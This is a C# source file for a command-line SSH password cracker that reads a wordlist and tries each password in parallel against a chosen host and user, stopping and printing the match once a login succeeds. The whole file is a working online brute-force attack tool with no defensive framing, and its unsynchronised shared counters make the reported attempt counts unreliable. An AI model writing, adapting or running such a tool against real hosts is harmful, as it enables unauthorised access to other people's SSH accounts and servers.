using CommandLine;
using Renci.SshNet;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace SshCracker
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
                .WithParsed(Run);
        }

        private static void Run(Options options)
        {
            // Connection information
            var user = options.UserName;
            var host = options.Host;
            var attempts = 0;
            var success = false;
            var match = "";
            var begin = DateTime.Now.Ticks;
            var noOfThreads = options.Threads;

            Console.WriteLine("================================================================");
            Console.WriteLine(" SSH Password Cracker Console v. 0.2.4.");
            Console.WriteLine("================================================================");
            Console.WriteLine();

            var list = File.ReadAllLines(options.PasswordList);

            Console.WriteLine("Using wordlist: " + options.PasswordList +
                              $" with {list.Length} words and {noOfThreads} threads. This might take some time.");

            var opts = new ParallelOptions
            {
                MaxDegreeOfParallelism = noOfThreads
            };

            Parallel.ForEach(list, opts, (w, loopState) =>
            {
                attempts++;

                try
                {
                    //Set up the SSH connection
                    using (var client = new SshClient(host, user, w))
                    {
                        //Start the connection
                        client.Connect();
                        if (options.Verbose) Console.WriteLine("Connected with " + w);
                        var output = client.RunCommand("echo test");
                        client.Disconnect();
                        Console.WriteLine(output.Result);

                        success = true;
                        match = w;
                        loopState.Stop();
                    }
                }
                catch
                {
                    // continue silently
                    if (options.Verbose) Console.WriteLine("Tried " + w + " with no success");
                }
            });

            var elapsed = TimeSpan.FromTicks(DateTime.Now.Ticks - begin);

            if (success)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"Done after {attempts} tries. Match:[{match}] for user:[{user}]. Elapsed: {elapsed:g}");
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine($"Done after {attempts} tries. No matches found. Try a different wordlist. Elapsed: {elapsed:g}");
            }

            if (Debugger.IsAttached)
            {
                Console.WriteLine("Hit any key...");
                Console.ReadKey();
            }
        }
    }
}